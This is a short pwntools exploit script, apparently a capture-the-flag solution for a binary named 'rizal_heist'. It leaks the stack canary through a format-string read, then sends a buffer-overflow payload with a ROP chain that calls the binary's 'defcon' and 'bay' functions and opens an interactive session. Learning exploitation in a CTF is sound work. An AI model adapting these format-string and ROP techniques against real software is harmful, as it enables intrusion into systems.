from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './rizal_heist'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

# ## FUZZING
# for i in range(100):
#     sh = start()
#     sh.sendlineafter(b'>', b'3')
#     sh.sendlineafter(b'>', f'%{i}$p')
#     sh.recvuntil('>> ')
#     get = sh.recvline().strip()
#     print(i, ":", get)

sh = start()
rop = ROP(elf)

sh.sendlineafter(b">", b'3')
sh.sendlineafter(b'>', b'%15$p')
sh.recvuntil(b'>> ')
canary = eval(sh.recvline().strip())
log.success(f'CANARY -> {hex(canary)}')

p = flat([
    cyclic(104),
    canary, cyclic(8),
    elf.sym['defcon'],
    rop.find_gadget(['pop rdi', 'pop rsi', 'pop rdx','ret']).address,
    0xffffffff, 0xcafebabe, 0xc0deb4be,
    elf.sym['bay']
])
sh.sendlineafter(b'>', b'1')
# gdb.attach(sh)
sh.sendlineafter(b'>', p)

sh.interactive()